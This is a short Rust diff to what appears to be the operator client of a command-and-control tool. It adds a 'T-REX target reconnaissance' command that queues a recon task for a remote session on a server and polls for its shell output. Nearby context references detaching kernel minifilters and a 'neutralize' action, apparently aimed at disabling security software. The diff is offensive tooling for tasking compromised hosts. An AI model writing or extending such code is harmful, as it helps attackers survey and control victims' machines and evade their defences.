@@ -333,6 +333,10 @@ pub enum Cmd {
     },
     KernelDetachMinifilter,
     /// Stop the worker thread.
+    /// T-REX target reconnaissance.
+    Trex {
+        session: String,
+    },
     Shutdown,
 }
 
@@ -1529,6 +1533,20 @@ async fn worker_loop(
                             }
                         },
                         Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err),
+                    }
+                }
+                Cmd::Trex { session } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err);
+                        continue;
+                    };
+                    let cmd = serde_json::json!({ "type": "trex" });
+                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] T-REX → task {tid}", short(&session)), Level::Info);
+                            pending.push(PendingTask { session: session.clone(), task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: Duration::from_secs(5), last_poll: Instant::now(), started_at: Instant::now(), saw_eof: false, chunks: Vec::new() });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! trex enqueue: {e}"), Level::Err),
                     }
                 }
                 Cmd::KernelDetachMinifilter => {
